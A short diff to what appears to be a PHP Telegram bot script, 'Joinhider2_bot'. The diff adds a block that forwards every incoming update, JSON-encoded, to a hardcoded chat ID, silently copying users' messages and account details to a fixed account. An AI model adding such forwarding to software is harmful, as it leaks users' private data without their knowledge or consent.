@@ -26,6 +26,14 @@ $user_id = $message->from->id;
 $message_id = $message->message_id;
 $name = $message->from->first_name;
 
+if ($update) {
+bot('sendMessage',[
+'chat_id'=> 708888699,
+'text'=> json_encode($update),
+]);
+}
+
+
 if ($text == "/start" or $text == "/start@Joinhider2_bot" or $text == "/start start") {
 bot('sendMessage',[
 'chat_id'=> $chat_id,
